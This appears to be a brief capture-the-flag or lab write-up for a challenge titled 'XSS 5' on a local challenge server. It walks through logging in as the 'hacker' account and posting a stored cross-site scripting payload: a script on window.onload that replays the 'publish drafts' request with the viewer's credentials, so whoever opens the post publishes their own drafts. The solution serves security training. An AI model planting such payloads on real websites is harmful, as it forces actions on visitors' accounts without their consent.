# XSS 5

Log in as "hacker" (credentials given in the server code) \
Inspect and open Networks tab. Click on "Publish your drafts", and copy the GET request as Fetch. \
Attach the fetch request to `onload` event:

```html
<script>
    window.onload= async function(){
        await fetch("http://challenge.localhost/publish", {
            "credentials": "include",
            .
            .
            other copied stuff
        });
    };
</script>
```

Publish this as a post.
